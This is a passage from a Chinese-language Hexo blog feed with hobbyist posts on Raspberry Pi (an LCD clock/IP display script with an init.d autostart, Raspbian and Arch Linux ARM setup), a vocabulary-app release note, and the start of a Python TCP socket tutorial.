title="IP和时钟的显示"></a>IP和时钟的显示</h3><p>这个脚本的功能是显示你的IP地址，若想显示无线接口的IP地址，请将代码中的eth0替换为wlan0或者wlan1即可。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> Adafruit_CharLCD <span class="hljs-keyword">import</span> Adafruit_CharLCD</span><br><span class="line"><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep, strftime</span><br><span class="line"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">lcd = Adafruit_CharLCD()</span><br><span class="line"></span><br><span class="line">cmd = <span class="hljs-string">"ip addr show eth0 | grep inet | awk '&#123;print $2&#125;' | cut -d/ -f1"</span></span><br><span class="line"></span><br><span class="line">lcd.begin(<span class="hljs-number">16</span>,<span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_cmd</span><span class="hljs-params">(cmd)</span>:</span></span><br><span class="line">    p = Popen(cmd, shell=<span class="hljs-keyword">True</span>, stdout=PIPE)</span><br><span class="line">    output = p.communicate()[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">    lcd.clear()</span><br><span class="line">    ipaddr = run_cmd(cmd)</span><br><span class="line">    lcd.message(datetime.now().strftime(<span class="hljs-string">'%b %d  %H:%M:%S\n'</span>))</span><br><span class="line">    lcd.message(<span class="hljs-string">'IP %s'</span> % ( ipaddr ) )</span><br><span class="line">    sleep(<span class="hljs-number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h3><p>运行代码很简单，直接输入下列命令即可。注意脚本的权限问题，可用chmod +x命令修改为可执行。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./Adafruit_CharLCD_IPclock_example.py</span><br></pre></td></tr></table></figure><h3 id="显示结果如下"><a href="#显示结果如下" class="headerlink" title="显示结果如下"></a>显示结果如下</h3><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/37d6ae252f94bc99c1c822299094e731.jpg"><h2 id="初始化脚本"><a href="#初始化脚本" class="headerlink" title="初始化脚本"></a>初始化脚本</h2><p>能成功显示出时间和IP地址固然很好，但是这需要我们手动去启动 <code>Adafruit_CharLCD_IPclock_example.py</code> 若是能在每次树莓派启动时，都能运行这个Python程序的话就会方便很多。下面我们将设置 <code>Adafruit_CharLCD_IPclock_example.py</code> 为开机自启动，而在关机时会自动关闭。</p><p>将下段代码粘贴到 <code>/etc/init.d/lcd</code>，注意，需要 <code>root</code> 权限才能在这个目录下执行写操作。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="hljs-comment"># Provides: LCD - date / time / ip address</span></span><br><span class="line"><span class="hljs-comment"># Required-Start: $remote_fs $syslog</span></span><br><span class="line"><span class="hljs-comment"># Required-Stop: $remote_fs $syslog</span></span><br><span class="line"><span class="hljs-comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="hljs-comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="hljs-comment"># Short-Description: Liquid Crystal Display</span></span><br><span class="line"><span class="hljs-comment"># Description: date / time / ip address</span></span><br><span class="line"><span class="hljs-comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#! /bin/sh</span></span><br><span class="line"><span class="hljs-comment"># /etc/init.d/lcd</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">export</span> HOME</span><br><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> <span class="hljs-keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Starting LCD"</span></span><br><span class="line">        /home/pi/Adafruit-Raspberry-Pi-Python-Code/Adafruit_CharLCD/Adafruit_CharLCD_IPclock_example.py  2&gt;&amp;1 &amp;</span><br><span class="line">    ;;</span><br><span class="line">    stop)</span><br><span class="line">        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Stopping LCD"</span></span><br><span class="line">    LCD_PID=`ps auxwww | grep Adafruit_CharLCD_IPclock_example.py | head -1 | awk <span class="hljs-string">'&#123;print $2&#125;'</span>`</span><br><span class="line">    <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$LCD_PID</span></span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: /etc/init.d/lcd &#123;start|stop&#125;"</span></span><br><span class="line">        <span class="hljs-built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line"><span class="hljs-keyword">esac</span></span><br><span class="line"><span class="hljs-built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>你需要相应的将路径修改为你实际保存该脚本的路径才行。</p><p>修改初始化脚本的执行权限：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /etc/init.d/lcd</span><br></pre></td></tr></table></figure><p>用 <code>update-rc.d</code> 命令使系统感知lcd初始化脚本：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-rc.d lcd defaults</span><br></pre></td></tr></table></figure><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/631943a50255e09afffbebfc4c1e948b.gif"><p>现在每次启动树莓派的时候lcd也会自动启动并显示出系统的时间和IP地址到屏幕上。这样你就可以在不用屏幕显示器的情况下知道树莓派的IP地址以及何时可以连接上它。</p><h2 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h2><p>最后但也是最重要的是：我的树莓派是按世界统一时间（UTC）配置的，但是我想让它显示出我所在的本地时间。以下命令可将树莓派设定为任意时区的本地时间，这个命令是一次性的，一旦完成设定，重启之后也不会失效。</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/8cfbac32e67b5f21b60dbb00c9cbba50.gif"><p>指令输入之后会转到一个选择时间域的程序，下移光标选择你所在的时区就可以了。</p><img src="/hexo-blog/20150412/用树莓派驱动一个-16×2-的-LCD/544f1443c1250d60cd9b31a0267ba26b.gif">]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派 Raspberry-Pi 折腾系列：系统安装及一些必要的配置</title>
      <link href="/hexo-blog/20150408/%E6%A0%91%E8%8E%93%E6%B4%BE-Raspberry-Pi-%E6%8A%98%E8%85%BE%E7%B3%BB%E5%88%97%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%BF%85%E8%A6%81%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/hexo-blog/20150408/%E6%A0%91%E8%8E%93%E6%B4%BE-Raspberry-Pi-%E6%8A%98%E8%85%BE%E7%B3%BB%E5%88%97%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%BF%85%E8%A6%81%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址： <a href="http://www.cnblogs.com/abel/p/3441175.html" target="_blank" rel="noopener">http://www.cnblogs.com/abel/p/3441175.html</a></p></blockquote><p>入手树莓派将近一个月了，很折腾，许多资源不好找，也很乱。简单整理一下自己用到的东西，方便以后自己或别人继续折腾。</p><img src="/hexo-blog/20150408/树莓派-Raspberry-Pi-折腾系列：系统安装及一些必要的配置/raspberry-pi-0.jpg"><a id="more"></a><h2 id="操作系统下载"><a href="#操作系统下载" class="headerlink" title="操作系统下载"></a>操作系统下载</h2><p>树莓派官方 <strong>Raspbian</strong> 系统下载：<a href="http://www.raspberrypi.org/downloads" target="_blank" rel="noopener">http://www.raspberrypi.org/downloads</a></p><p>或直接下载 <a href="http://downloads.raspberrypi.org/raspbian_latest.torrent" target="_blank" rel="noopener">http://downloads.raspberrypi.org/raspbian_latest.torrent</a> 最新版的 BT 种子。</p><p>还有一个选择是由国人制作的超级精简版，更低内存占用：<a href="http://pan.baidu.com/share/link?shareid=167943&amp;uk=1412008571" target="_blank" rel="noopener">http://pan.baidu.com/share/link?shareid=167943&amp;uk=1412008571</a></p><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>所谓“安装系统”其实不如说是“恢复”下载到的系统镜像到内存卡上，这个过程也没什么难度，就是看内存卡的速度，慢慢等而已。需要注意的是，市面上部分 4G 的内存卡，实际大小才 3.6G 多，会提示空间不足，所以还是直接购买 8G 吧，也差不了几块钱。</p><p>在 Windows 下可以使用 <strong>Win32 Disk Imager</strong> 进行镜像恢复，非常方便，也是树莓派官方推荐的方法。官方下载地址：<a href="http://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener">http://sourceforge.net/projects/win32diskimager/</a></p><img src="/hexo-blog/20150408/树莓派-Raspberry-Pi-折腾系列：系统安装及一些必要的配置/raspberry-pi-1.gif"><h2 id="通过-SSH-远程访问"><a href="#通过-SSH-远程访问" class="headerlink" title="通过 SSH 远程访问"></a>通过 SSH 远程访问</h2><p>老实说，我一直把树莓派定位为“<em>一个扔在某个角落就可以自己跑得很欢的小电脑</em>”，加上那仅有的两个 USB 口，一个插了 USB 无限网卡，另一个再拖个键盘或鼠标啥的，实在很不方便，那么最好还是能远程访问吧。</p><p>好在树莓派默认是有开启 SSH 的，但是我们系统刚安装，IP 还没设置，怎么找到它的 IP 地址呢？这时候就推荐使用另一个神器 <strong>PortScan</strong> 来找出我们的机器：</p><img src="/hexo-blog/20150408/树莓派-Raspberry-Pi-折腾系列：系统安装及一些必要的配置/raspberry-pi-2.gif"><p>打开 PortScan 选择扫描范围，可以很方便的找出局域网中的其它机器，一般家庭中也没太多机器，找出树莓派是很容易的，如果是在公司，有很多机器的话，那么可以忽略那些有机器名的，然后剩下的一个一个尝试吧…</p><p>PortScan 下载地址：<a href="http://abel.oss.aliyuncs.com/file/PortScan.zip" target="_blank" rel="noopener">http://abel.oss.aliyuncs.com/file/PortScan.zip</a></p><h2 id="ROOT-账号设置"><a href="#ROOT-账号设置" class="headerlink" title="ROOT 账号设置"></a>ROOT 账号设置</h2><p>如果你安装的是官方的 Raspbian 系统，那么默认的登录帐号为 <code>pi</code> 密码是 <code>raspberry</code></p><p>为了方便折腾，建议第一时间启用 ROOT 账号吧~ 这个也很简单的，只需要执行一下两句命令即可：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 设置 root 账号的密码，会让你输入两次新密码</span></span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 启用 root 账号登录</span></span><br><span class="line">sudo passwd --unlock root</span><br></pre></td></tr></table></figure><p>执行完之后，用 <code>reboot</code> 命令重启就可以用 root 登录啦。</p><h2 id="扩展可用空间"><a href="#扩展可用空间" class="headerlink" title="扩展可用空间"></a>扩展可用空间</h2><p>第一次用 root 登录，会自动弹出树莓派的高级设置面板（以后也可以通过 <code>raspi-config</code> 命令进入）：</p><img src="/hexo-blog/20150408/树莓派-Raspberry-Pi-折腾系列：系统安装及一些必要的配置/raspberry-pi-3.gif"><p>选择第一项 <strong>Expand Filesystem</strong> 扩展 SD 卡上可用的空间，不然以后会有很多大软件，不能安装（提示空间不足，例如 mysql）。</p><p>扩展之后可以通过 <code>df -h</code> 命令看到效果~</p><h2 id="更换软件源（apt-get-sources）"><a href="#更换软件源（apt-get-sources）" class="headerlink" title="更换软件源（apt-get sources）"></a>更换软件源（apt-get sources）</h2><p>树莓派的服务器实在太太太太太太慢了！会导致你安装一个几M的东西都要等大半天！肿么办！</p><p>好在树莓派官方有提供一个镜像列表：<a href="http://www.raspbian.org/RaspbianMirrors" target="_blank" rel="noopener">http://www.raspbian.org/RaspbianMirrors</a></p><p>在里面找到了几个国内的镜像，经过几番尝试，觉得来自中科大的速度非常不错~ 咱们就换成中科大的吧，镜像主页：<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian</a></p><p>根据教程，咱们来编辑 <code>/etc/apt/sources.list</code> 文件。这里推荐用 <code>nano</code> 命令编辑，舍得去弄什么 VIM 啦。命令如下：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>进入编辑界面，删除原有的内容，粘贴中科大提供的内容，结果如下：</p><img src="/hexo-blog/20150408/树莓派-Raspberry-Pi-折腾系列：系统安装及一些必要的配置/raspberry-pi-4.gif"><p>然后使用 <code>Ctrl+O</code> 保存文件，<code>Ctrl+X</code> 退出编辑器。</p><p>然后执行 <code>apt-get update</code> 命令更新软件列表。</p><h2 id="设置静态-IP-地址"><a href="#设置静态-IP-地址" class="headerlink" title="设置静态 IP 地址"></a>设置静态 IP 地址</h2><p>回到刚刚第二点提到的，不知道 IP 地址的问题，咱们要给树莓派设置一个静态 IP，省得 IP 变换又要重新找机器。还是用 nano 来编辑网络接口文件：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>如果你要设置的是<strong>有线</strong>网卡的 IP 地址，那么把 <code>eth0</code> 的 <code>dhcp</code> 改成 <code>static</code> 然后在下一行追加 IP 信息，结果大概如下：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.200   <span class="hljs-comment"># 设定的静态IP地址</span></span><br><span class="line">netmask 255.255.255.0   <span class="hljs-comment"># 网络掩码</span></span><br><span class="line">gateway 192.168.1.1     <span class="hljs-comment"># 网关</span></span><br></pre></td></tr></table></figure><p>如果你要设置的是无线网卡的，那么除了把 <code>wlan0</code> 的 <code>dhcp</code> 改成 <code>static</code> 之外，还需要填写无线网的名称和密码，编辑后的结果大概如下：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iface wlan0 inet static</span><br><span class="line">    wpa-ssid Your_Wifi_SSID</span><br><span class="line">    wpa-psk Your_Wifi_Password</span><br><span class="line">address 192.168.1.200 <span class="hljs-comment"># 设定的静态IP地址</span></span><br><span class="line">netmask 255.255.255.0 <span class="hljs-comment"># 网络掩码</span></span><br><span class="line">gateway 192.168.1.1   <span class="hljs-comment"># 网关</span></span><br><span class="line">network 192.168.1.1   <span class="hljs-comment"># 网络地址</span></span><br><span class="line"><span class="hljs-comment"># wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</span></span><br></pre></td></tr></table></figure><p>▲ 注意注释掉最后一行</p><p>搞定之后，咱们用 <code>poweroff</code> 命令关掉树莓派，等到机器上的绿灯不闪了，把电源拔掉，再把网线拔掉，重新连接电源，稍等一会，看看是不是就通过无线网络的 IP 地址可以访问了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>至此，要折腾树莓派的几个准备工作都完成了，有了这些，以后折腾也更佳方便。</p><p>由于我当初手贱没有购买面驱动的 USB 网卡，买的是一个要自己编译驱动的，所以我折腾的东西还有很多，下次专门再来说说无线网卡驱动的事吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为树莓派制作 Arch Linux SD 卡</title>
      <link href="/hexo-blog/20150408/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%B6%E4%BD%9C-Arch-Linux-SD-%E5%8D%A1/"/>
      <url>/hexo-blog/20150408/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%B6%E4%BD%9C-Arch-Linux-SD-%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>该文为译文，原文地址：</em> <a href="http://archlinuxarm.org/platforms/armv6/raspberry-pi" target="_blank" rel="noopener">http://archlinuxarm.org/platforms/armv6/raspberry-pi</a></p></blockquote><p>将下面的 <code>sdX</code> 替换成你的 SD 卡的设备名。</p><ol><li><p>使用 fdisk 为 SD 卡分区：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/sdX</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li><p>根据 fdisk 的提示删除旧分区。然后创建一个新分区：</p><ol><li>输入 <code>o</code>。这将清除驱动器上的所有分区。</li><li>输入 <code>p</code> 列出分区。列表中应该没有任何分区了。</li><li>输入 <code>n</code>，然后 <code>p</code> 设置为主分区，<code>1</code> 设置为驱动器第一个分区，按 <code>回车</code> 不更改起始扇区的默认值，输入 <code>+100M</code> 设置结束扇区。</li><li>输入 <code>t</code>，然后 <code>c</code> 将第一个分区设为 W95 FAT32 (LBA) 格式。</li><li>输入 <code>n</code>，然后 <code>p</code> 设置为主分区，<code>2</code> 设置为驱动器第二个分区，按 <code>回车</code> 不更改起始扇区和结束扇区的默认值。</li><li>输入 <code>w</code> 保存分区表退出。</li></ol></li><li><p>创建并挂载 FAT 文件系统：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkfs.vfat /dev/sdX1</span><br><span class="line">mkdir boot</span><br><span class="line">mount /dev/sdX1 boot</span><br></pre></td></tr></table></figure></li><li><p>创建并挂载 ext4 文件系统：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdX2</span><br><span class="line">mkdir root</span><br><span class="line">mount /dev/sdX2 root</span><br></pre></td></tr></table></figure></li><li><p>下载并解压 root 文件系统（用 root 身份，而不是 sudo）：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://archlinuxarm.org/os/ArchLinuxARM-rpi-2-latest.tar.gz</span><br><span class="line">bsdtar -xpf ArchLinuxARM-rpi-2-latest.tar.gz -C root</span><br><span class="line">sync</span><br></pre></td></tr></table></figure></li><li><p>将 boot 文件移动至第一个分区：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv root/boot/* boot</span><br></pre></td></tr></table></figure></li><li><p>卸载这两个分区：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umount boot root</span><br></pre></td></tr></table></figure></li><li><p>将 SD 卡插入树莓派，连接至以太网，提供 5V 电源。</p></li><li><p>使用串口终端或者 SSH 访问路由器提供的树莓派 IP 地址，默认 root 密码为 <code>root</code>。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 树莓派 </tag>
            
            <tag> Arch Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Word ～ v0.2.2 背单词软件发布</title>
      <link href="/hexo-blog/20130903/Hello-Word-%EF%BD%9E-v0-2-2-%E8%83%8C%E5%8D%95%E8%AF%8D%E8%BD%AF%E4%BB%B6%E5%8F%91%E5%B8%83/"/>
      <url>/hexo-blog/20130903/Hello-Word-%EF%BD%9E-v0-2-2-%E8%83%8C%E5%8D%95%E8%AF%8D%E8%BD%AF%E4%BB%B6%E5%8F%91%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Word"><a href="#Hello-Word" class="headerlink" title="Hello Word ~"></a>Hello Word ~</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>基于艾宾浩斯记忆曲线，强大的单词记忆软件，为用户提供简单、科学、高效的背单词方法。</p><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>小学生、中学生、大学生、研究生、博士生、教师、出国留学者，以及各类英语学习者。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>基于艾宾浩斯记忆曲线</li><li>实时发音，男声/女声可任意切换（需要联网哦）</li><li>托盘图标人性化提醒</li><li>自由选择词库</li><li>使用 Python + Qt 开发</li></ul><a id="more"></a><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201636_NmlK_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201504_5Ud4_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201526_k6rs_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201548_OsAF_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201607_pto9_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201615_I2JB_730461.png"> <img src="/hexo-blog/20130903/Hello-Word-～-v0-2-2-背单词软件发布/201718_zYyy_730461.png"><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li>Windows<ul><li>x86-32bit <a href="https://sourceforge.net/projects/hello-word-python/files/build/0.2.2/helloword-0.2.2-x86.rar/download" target="_blank" rel="noopener">下载地址</a></li><li>x64-64bit <a href="https://sourceforge.net/projects/hello-word-python/files/build/0.2.2/helloword-0.2.2-x64.rar/download" target="_blank" rel="noopener">下载地址</a></li></ul></li><li>Linux<ul><li>Fedora 17 <a href="#">即将推出</a></li></ul></li></ul><h2 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h2><p><strong>whypro</strong> @ <strong>Whypro Studio</strong></p><p><a href="http://whypro.duapp.com" target="_blank" rel="noopener">鳗鱼工作室</a><br><a href="http://my.oschina.net/apoptosis" target="_blank" rel="noopener">技术博客</a></p><hr><p>2013-09-03</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 实现 socket 通讯 (TCP/UDP) </title>
      <link href="/hexo-blog/20130828/Python-%E5%AE%9E%E7%8E%B0-socket-%E9%80%9A%E8%AE%AF-TCP-UDP/"/>
      <url>/hexo-blog/20130828/Python-%E5%AE%9E%E7%8E%B0-socket-%E9%80%9A%E8%AE%AF-TCP-UDP/</url>
      
        <content type="html"><![CDATA[<h1 id="1-TCP"><a href="#1-TCP" class="headerlink" title="1. TCP"></a>1. TCP</h1><h2 id="1-1-TCP-Server"><a href="#1-1-TCP-Server" class="headerlink" title="1.1 TCP-Server"></a>1.1 TCP-Server</h2><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># TCP-Server</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 1. 创建 socket 对象</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 2. 将 socket 绑定到指定地址</span></span><br><span class="line">address = (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10140</span>) </span><br><span class="line">s.bind(address)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 3. 接收连接请求</span></span><br><span class="line">s.listen(<span class="hljs-number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 4. 等待客户请求一个连接</span></span><br><span class="line"><span class="hljs-comment"># 调用 accept 方法时，socket 会进入 "waiting" 状态。</span></span><br><span class="line"><span class="hljs-comment"># accept方法返回一个含有两个元素的元组 (connection, address)。</span></span><br><span class="line"><span class="hljs-comment"># 第一个元素 connection 是新的 socket 对象，服务器必须通过它与客户通信；</span></span><br><span class="line"><span class="hljs-comment"># 第二个元素 address 是客户的 Internet 地址。</span></span><br><span class="line">ss, addr = s.accept()</span><br><span class="line"><span class="hljs-keyword">print</span> <span class="hljs-string">'got connect from'</span>, addr</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 5. 处理：服务器和客户端通过 send 和 recv 方法通信</span></span><br><span class="line"><span class="hljs-comment"># send 方法返回已发送的字节个数。</span></span><br><span class="line"><span class="hljs-comment"># 调用 recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。</span></span><br><span class="line"><span class="hljs-comment"># recv方法在接收数据时会进入 "blocked" 状态，最后返回一个字符 串，用它表示收到的数据。</span></span><br><span class="line"><span class="hljs-comment"># 如果发送的数据量超过了recv 所允许的，数据会被截短。</span></span><br><span class="line"><span class="hljs-comment"># 多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区删除。</span></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    ra = ss.recv(<span class="hljs-number">512</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'client:'</span>, ra</span><br><span class="line">    ss.send(<span class="hljs-string">'received'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 6. 传输结束，关闭连接</span></span><br><span class="line">ss.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-2-TCP-Client"><a href="#2-2-TCP-Client" class="headerlink" title="2.2 TCP-Client"></a>2.2 TCP-Client</h2><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># TCP-Client</span></span><br><span class="line"></span><br><span class="line"><span 